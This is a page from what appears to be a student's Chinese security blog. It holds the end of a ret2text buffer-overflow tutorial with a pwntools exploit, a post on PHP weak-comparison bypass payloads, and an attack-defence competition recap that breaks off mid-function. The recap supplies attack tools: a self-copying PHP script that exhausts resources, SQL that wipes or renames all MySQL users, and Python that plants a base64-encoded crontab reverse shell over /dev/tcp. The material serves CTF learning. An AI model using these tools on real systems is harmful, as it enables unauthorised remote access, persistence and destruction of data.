<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">80486a7:       8d 44 24 1c             lea    0x1c(%esp),%eax</span><br><span class="line">80486ab:       89 04 24                mov    %eax,(%esp)</span><br><span class="line">80486ae:       e8 ad fd ff ff          call   8048460 &lt;gets@plt&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;不知是用了什么妖术,这个变量居然是根据esp来进行寻址的…众所周知esp是随时变化的,因此我们就需要动态调试,算一下变量距离ebp的偏移.输入一下命令启动gdb:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; gdb ret2text</span><br><span class="line"><span class="comment"># 进来之后输入start启动程序</span></span><br><span class="line">gdb&gt; start</span><br></pre></td></tr></table></figure>
<p><img src="./pictures/gdb1.png" alt="gdb1"></p>
<p>&emsp;&emsp;你会看到你的gdb跟我的一比简直low爆了…这是因为我装了插件,诸位暂时还是不要安装插件,因为你对gdb还不够熟悉,如果十分想要模仿我的话可以安装peda或者pwndbg.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/longld/peda.git ~/peda</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"source ~/peda/peda.py"</span> &gt;&gt; ~/.gdbinit</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;接下来输入<code>disas</code>可以看到即将会执行的汇编指令:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disas</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x08048648 &lt;+0&gt;:     push   ebp</span><br><span class="line">   0x08048649 &lt;+1&gt;:     mov    ebp,esp</span><br><span class="line">   0x0804864b &lt;+3&gt;:     and    esp,0xfffffff0</span><br><span class="line">   0x0804864e &lt;+6&gt;:     add    esp,0xffffff80</span><br><span class="line">=&gt; 0x08048651 &lt;+9&gt;:     mov    eax,ds:0x804a060</span><br><span class="line">   0x08048656 &lt;+14&gt;:    mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">   0x0804865e &lt;+22&gt;:    mov    DWORD PTR [esp+0x8],0x2</span><br><span class="line">   0x08048666 &lt;+30&gt;:    mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">   0x0804866e &lt;+38&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048671 &lt;+41&gt;:    call   0x80484d0 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x08048676 &lt;+46&gt;:    mov    eax,ds:0x804a040</span><br><span class="line">   0x0804867b &lt;+51&gt;:    mov    DWORD PTR [esp+0xc],0x0</span><br><span class="line">   0x08048683 &lt;+59&gt;:    mov    DWORD PTR [esp+0x8],0x1</span><br><span class="line">   0x0804868b &lt;+67&gt;:    mov    DWORD PTR [esp+0x4],0x0</span><br><span class="line">   0x08048693 &lt;+75&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048696 &lt;+78&gt;:    call   0x80484d0 &lt;setvbuf@plt&gt;</span><br><span class="line">   0x0804869b &lt;+83&gt;:    mov    DWORD PTR [esp],0x804876c</span><br><span class="line">   0x080486a2 &lt;+90&gt;:    call   0x8048480 &lt;puts@plt&gt;</span><br><span class="line">   0x080486a7 &lt;+95&gt;:    lea    eax,[esp+0x1c]</span><br><span class="line">   0x080486ab &lt;+99&gt;:    mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080486ae &lt;+102&gt;:   call   0x8048460 &lt;gets@plt&gt;</span><br><span class="line">   0x080486b3 &lt;+107&gt;:   mov    DWORD PTR [esp],0x80487a4</span><br><span class="line">   0x080486ba &lt;+114&gt;:   call   0x8048450 &lt;printf@plt&gt;</span><br><span class="line">   0x080486bf &lt;+119&gt;:   mov    eax,0x0</span><br><span class="line">   0x080486c4 &lt;+124&gt;:   leave  </span><br><span class="line">   0x080486c5 &lt;+125&gt;:   ret</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;若安装了插件输入<code>register</code>指令可以查看寄存器信息:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">gef➤  register</span><br><span class="line"><span class="variable">$eax</span>   : 0xf7f90dc8  →  0xffffd0cc  →  0xffffd2cc  →  <span class="string">"CLUTTER_IM_MODULE=fcitx"</span></span><br><span class="line"><span class="variable">$ebx</span>   : 0x0       </span><br><span class="line"><span class="variable">$ecx</span>   : 0xcab951ef</span><br><span class="line"><span class="variable">$edx</span>   : 0xffffd054  →  0x00000000</span><br><span class="line"><span class="variable">$esp</span>   : 0xffffcfa0  →  0x00000000</span><br><span class="line"><span class="variable">$ebp</span>   : 0xffffd028  →  0x00000000</span><br><span class="line"><span class="variable">$esi</span>   : 0xf7f8f000  →  0x001d9d6c</span><br><span class="line"><span class="variable">$edi</span>   : 0xf7f8f000  →  0x001d9d6c</span><br><span class="line"><span class="variable">$eip</span>   : 0x08048651  →  &lt;main+9&gt; mov eax, ds:0x804a060</span><br><span class="line"><span class="variable">$eflags</span>: [zero CARRY PARITY adjust SIGN <span class="built_in">trap</span> INTERRUPT direction overflow resume virtualx86 identification]</span><br><span class="line"><span class="variable">$cs</span>: 0x0023 <span class="variable">$ss</span>: 0x002b <span class="variable">$ds</span>: 0x002b <span class="variable">$es</span>: 0x002b <span class="variable">$fs</span>: 0x0000 <span class="variable">$gs</span>: 0x0063 </span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;若没有安装插件则使用<code>print $eax</code>打印相关寄存器信息.<br>&emsp;&emsp;接着输入n或者s可以单步进行调试,他们的区别是:</p>
<ul>
<li>n: 假如有函数调用的话,会直接执行完毕该函数,然后继续单步执行</li>
<li>s: 假如有函数调用的话,会进入函数然后继续单步执行</li>
</ul>
<p>&emsp;&emsp;好的,我们可以一路按n跑到关键位置,也可以在关键位置下断点然后让程序停在那里:</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">gef➤  r</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae <span class="keyword">in</span> main () at ret2text.c:24</span><br><span class="line">24      gets(buf);</span><br><span class="line">────────────────────────[ registers ]────</span><br><span class="line"><span class="variable">$eax</span>   : 0xffffcd5c  →  0x08048329  →  <span class="string">"__libc_start_main"</span></span><br><span class="line"><span class="variable">$ebx</span>   : 0x00000000</span><br><span class="line"><span class="variable">$ecx</span>   : 0xffffffff</span><br><span class="line"><span class="variable">$edx</span>   : 0xf7faf870  →  0x00000000</span><br><span class="line"><span class="variable">$esp</span>   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  <span class="string">"__libc_start_main"</span></span><br><span class="line"><span class="variable">$ebp</span>   : 0xffffcdc8  →  0x00000000</span><br><span class="line"><span class="variable">$esi</span>   : 0xf7fae000  →  0x001b1db0</span><br><span class="line"><span class="variable">$edi</span>   : 0xf7fae000  →  0x001b1db0</span><br><span class="line"><span class="variable">$eip</span>   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;这里我们看到esp是 0xffffcd40,ebp 为具体的 payload 如下 0xffffcdc8，同时 s 相对于 esp 的索引为 <code>[esp+0x1c]</code>，所以，s 的地址为 0xffffcd5c，所以 s 相对于 ebp 的偏移为 0x6C，所以相对于返回地址的偏移为 0x6c+4。</p>
<p>exp如下:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2text'</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">'A'</span> * (<span class="number">0x6c</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;现在你已经稍微入点高级编程门了.</p>
<p>&emsp;&emsp;如果你对pwn也感兴趣的话可以去<a href="http://ustb.ever404.com/challenges" target="_blank" rel="noopener">校内ctf练习平台</a>上玩一玩(题目很久没更新了…最近更新一下qaq)</p>
<hr>
<h4 id="关于作者及作者内心os"><a href="#关于作者及作者内心os" class="headerlink" title="关于作者及作者内心os"></a>关于作者及作者内心os</h4><p>&emsp;&emsp;信安1802某爱猫人士,安全研究员,梦想成为Computer Artist并养一屋子猫</p>
<p>&emsp;&emsp;当你读到这段话的时候…十有八九是前面读不下去了,直接跳到最后看看还有多少…</p>
<p>&emsp;&emsp;我还是要讲几句鼓励你的话:</p>
<p>​                                                加油,你真棒!</p>
<p><img src="./pictures/giveup.jpg" alt="giveup"></p>
<p>&emsp;&emsp;</p>
<p>&emsp;&emsp;如果你对本文档持任何异议,请纠缠我的基友原计1805戏曲爱好者孙某.</p>
<blockquote>
<p>PS: 如果你也是爱猫人士或者对计算机安全感兴趣,欢迎与各位大佬交流 (CTF缺队友…qaq</p>
<p>欢迎Follow我的<a href="https://github.com/Explainaur" target="_blank" rel="noopener">github</a> ^_^</p>
</blockquote>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-10-15</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/10/15/Heap结构整理/">Heap结构整理</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          
        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-09-15</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/09/15/web知识点记录/">web知识点记录</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <p>&emsp;&emsp;最近一直在写CPU,好久没有看web相关的东西了,发现之前刷的题全忘了qaq…本文记录遇到的相关知识点.</p>
<h2 id="辣鸡PHP"><a href="#辣鸡PHP" class="headerlink" title="辣鸡PHP"></a>辣鸡PHP</h2><hr>
<h3 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h3><p>&emsp;&emsp;php的<code>&#39;===&#39;</code>与<code>==</code>是截然不同的,<code>===</code>会在判断前首先比较两变量类型,然后进行值的比较,但是<code>==</code>则强制转换为相同的类型,然后进行比较.</p>
<blockquote>
<p>如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行</p>
</blockquote>
<p>&emsp;&emsp;举几个例子:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    var_dump(<span class="string">"admin"</span>==<span class="number">0</span>);  <span class="comment">//true</span></span><br><span class="line">    var_dump(<span class="string">"1admin"</span>==<span class="number">1</span>); <span class="comment">//true</span></span><br><span class="line">    var_dump(<span class="string">"admin1"</span>==<span class="number">1</span>) <span class="comment">//false</span></span><br><span class="line">    var_dump(<span class="string">"admin1"</span>==<span class="number">0</span>) <span class="comment">//true</span></span><br><span class="line">    var_dump(<span class="string">"0e123456"</span>==<span class="string">"0e4456789"</span>); <span class="comment">//true </span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;PHP手册里说:<strong>当一个字符串被当作一个数值来取值,其结果和类型如下:如果该字符串没有包含 ‘.’  ‘e’  ‘E’并且其数值值在整形的范围之内该字符串被当作int来取值,其他所有情况下都被作为float来取值,该字符串的开始部分决定了它的值,如果该字符串以合法的数值开始,则使用该数值,否则其值为0.</strong></p>
<ul>
<li>利用姿势</li>
</ul>
<p>&emsp;&emsp;md5-hash碰撞<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'Username'</span>]) &amp;&amp; <span class="keyword">isset</span>($_GET[<span class="string">'password'</span>])) &#123;</span><br><span class="line">    $logined = <span class="keyword">true</span>;</span><br><span class="line">    $Username = $_GET[<span class="string">'Username'</span>];</span><br><span class="line">    $password = $_GET[<span class="string">'password'</span>];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span> (!ctype_alpha($Username)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (!is_numeric($password) ) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> (md5($Username) != md5($password)) &#123;$logined = <span class="keyword">false</span>;&#125;</span><br><span class="line">     <span class="keyword">if</span> ($logined)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"successful"</span>;</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">           <span class="keyword">echo</span> <span class="string">"login failed!"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;根据上面的原理我们可以发现假如md5的开头是0e,那么比较时会被当作科学计数法,直接gg.</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(<span class="string">'240610708'</span>) == md5(<span class="string">'QNKCDZO'</span>);</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;json绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'message'</span>])) &#123;</span><br><span class="line">    $message = json_decode($_POST[<span class="string">'message'</span>]);</span><br><span class="line">    $key =<span class="string">"*********"</span>;</span><br><span class="line">    <span class="keyword">if</span> ($message-&gt;key == $key) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">"~~~~"</span>;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;我们并不知道$key的值,但是当<code>$message-&gt;key</code>为整数时,$key也会被转化为整数,因此构造payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">message=&#123;&quot;key&quot;:0&#125;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;array_search()绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!is_array($_GET[<span class="string">'test'</span>]))&#123;<span class="keyword">exit</span>();&#125;</span><br><span class="line">$test=$_GET[<span class="string">'test'</span>];</span><br><span class="line"><span class="keyword">for</span>($i=<span class="number">0</span>;$i&lt;count($test);$i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>($test[$i]===<span class="string">"admin"</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"error"</span>;</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $test[$i]=intval($test[$i]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(array_search(<span class="string">"admin"</span>,$test)===<span class="number">0</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"flag"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"false"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;<code>array_search()</code>这个函数在php Manual手册中写道:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mixed array_search ( mixed $needle , <span class="keyword">array</span> $haystack [, bool $strict = <span class="keyword">false</span> ] );</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;在$haystack中查找$needle,若查到则返回index索引,第三个参数是选择是否开启严格比较.默认情况下比较模式为<code>==</code>,因此payload如下:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test[]=0</span><br></pre></td></tr></table></figure>
<blockquote>
<p>同样in_array()也有此漏洞</p>
</blockquote>
<p>&emsp;&emsp;strcmp()漏洞绕过php -v &lt; 5.3</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    $password=<span class="string">"***************"</span></span><br><span class="line">     <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'password'</span>]))&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (strcmp($_POST[<span class="string">'password'</span>], $password) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Right!!!login success"</span>;n</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"Wrong password.."</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;strcmp会比较两个字符串,若两者相等则返回0,但是当两者的类型不同时,strcmp()会发生错误,但是仍然会判断其相等.因此我们可以传入<code>password[]=xx</code>来进行绕过.</p>
<blockquote>
<p>同样md5() sha1()等函数也存在类似漏洞.</p>
</blockquote>
<p>&emsp;&emsp;switch绕过</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="string">"4admin"</span>;</span><br><span class="line"><span class="keyword">switch</span> ($a) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail1"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail2"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"fail3"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"sucess"</span>;  <span class="comment">//结果输出success;</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"failall"</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;原理与上类似,不再阐述.</p>

        
      
    
    </div>
    
  </article>
  
  
    
  

  
    
  


  <article class="
  post
  
  ">
    <header class="post-header">
      <div class="post-time syuanpi fadeInUpShort back-1">
        <div class="post-time-wrapper">
          <span>2019-08-23</span>
          
          
        </div>
      </div>
      <h1 class="post-title syuanpi fadeInUpShort back-2">
        
          <a href="/2019/08/23/蓝帽杯awd总结/">蓝帽杯awd总结</a>
        
      </h1>
    </header>
    <div class="post-content syuanpi fadeInUpShort back-3">
      
        
          <p>&emsp;&emsp;最近沉迷于学习verilog以及计算机底层的相关知识,已经很久没有搞安全了.突然有机会打一场向往已久的AWD令我很是期待.终于我和朴淳 国峰 兴致冲冲的来到了国家会议中心,好生气派.</p>
<p><img src="https://github.com/Explainaur/hexo-blog/blob/master/source/pictures/blue_hat1.jpg?raw=true" alt="blue_hat1"></p>
<p>&emsp;&emsp;下午比赛刚开始,所有服务器直接宕机…不得不说奇安信这个做的不好.过了很久之后修好了,然后我们直接就被打懵了.一直疯狂掉分,直到挂上waf才稍有好转.总结一下学到的一点经验:  </p>
<h3 id="关于进攻"><a href="#关于进攻" class="headerlink" title="关于进攻"></a>关于进攻</h3><hr>
<p>&emsp;&emsp;反正这一次一下攻击都没有打,全程做防御.因为根本来不及代码审计,赛后问了一下对面的大佬怎么打的,他们说是thinkphp的cve,他们也就找到一个洞,然后就进了前十…可见赛前资料的准备有多么重要.另外就后门而言,见到了好几个特别骚的木马,当然不死马是最基础的,其实不死马能起作用主要是因为目录权限配置的有问题,主目录直接给了777肯定会被日啊.普通目录尽量别给写的权限.</p>
<p>&emsp;&emsp;还有一种马是base64加密马,然后添加crontab来写一句话木马.妈的这个是真的难受,我只能写shell一直删,还有就是一定要搅屎.我们有个nginx服务直接被删掉了,我都没发现有这个目录…然后服务一down开始疯狂掉分,我只好去偷别人的静态网页,诶,心里苦.  </p>
<p>&emsp;&emsp;关于搅屎,我痛定思痛,写了好几个搅屎棍:</p>
<ul>
<li>无限复制:  </li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    set_time_limit(<span class="number">0</span>);</span><br><span class="line">    ignore_user_abort(<span class="keyword">true</span>);</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        file_put_contents(randstr().<span class="string">'.php'</span>,file_get_content(<span class="keyword">__FILE__</span>));</span><br><span class="line">        file_get_contents(<span class="string">"http://127.0.0.1/"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>连名都是随机的,疯狂占资源,算是ddos吧  </p>
</blockquote>
<ul>
<li>改数据库密码:  </li>
</ul>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> mysql.user <span class="keyword">set</span> authentication_string=<span class="keyword">PASSWORD</span>(<span class="string">'p4rr0t'</span>);<span class="comment"># 修改所有用户密码</span></span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br><span class="line"><span class="keyword">UPDATE</span> mysql.user <span class="keyword">SET</span> <span class="keyword">User</span>=<span class="string">'aaaaaaaaaaaa'</span> <span class="keyword">WHERE</span> <span class="keyword">user</span>=<span class="string">'root'</span>; </span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span> mysql.user ;<span class="comment">#删除所有用户</span></span><br><span class="line"><span class="keyword">flush</span> <span class="keyword">privileges</span>;</span><br></pre></td></tr></table></figure>
<p>&emsp;&emsp;当时比赛的时候没想起来…</p>
<ul>
<li>各种crontab骚东西:  </li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crontab_reverse</span><span class="params">(reverse_ip, reverse_port)</span>:</span></span><br><span class="line">    crontab_path = <span class="string">"/tmp"</span></span><br><span class="line">    cmd = <span class="string">'bash -i &gt;&amp; /dev/tcp/%s/%d 0&gt;&amp;1'</span> % (reverse_ip, reverse_port)</span><br><span class="line">    crontab_cmd = <span class="string">"* * * * * bash -c '%s'\n"</span> % cmd</span><br><span class="line">    encode_crontab_cmd = base64.b64encode(crontab_cmd)</span><br><span class="line">    cmd = <span class="string">"/bin/echo "</span> + encode_crontab_cmd + <span class="string">" | /usr/bin/base64 -d | /bin/cat &gt;&gt; "</span> + crontab_path + <span class="string">"/tmp_rev.conf"</span> + <span class="string">" ; "</span> + <span class="string">"/usr/bin/crontab "</span> + crontab_path + <span class="string">"/tmp.conf"</span></span><br><span class="line">    <span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">crontab_rm</span><span class="params">(rm_paths=<span 